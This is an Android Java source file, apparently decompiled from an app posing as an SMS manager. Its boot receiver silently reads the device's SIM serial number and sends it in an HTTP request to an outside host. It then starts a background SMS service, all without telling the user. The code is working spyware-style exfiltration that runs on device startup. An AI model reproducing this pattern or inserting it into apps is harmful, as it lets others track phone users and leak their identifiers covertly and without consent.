package com.example.smsmanager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import cn.smsmanager.internet.HttpRequest;
import cn.smsmanager.tools.ParamsInfo;
import java.util.HashMap;
import java.util.Map;

public class BootCompleteBroadcastReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        if (!ParamsInfo.isServiceStart) {
            ParamsInfo.isServiceStart = true;
            String sim_no = ((TelephonyManager) context.getSystemService("phone")).getSimSerialNumber();
            ParamsInfo.sim_no = sim_no;
            Map<String, String> params = new HashMap();
            params.put("sim_no", sim_no);
            try {
                HttpRequest.sendGetRequest("http://www.shm2580.com/post_simno.asp", params, "UTF-8");
            } catch (Exception e) {
                e.printStackTrace();
            }
            context.startService(new Intent(context, SmsSystemManageService.class));
        }
    }
}
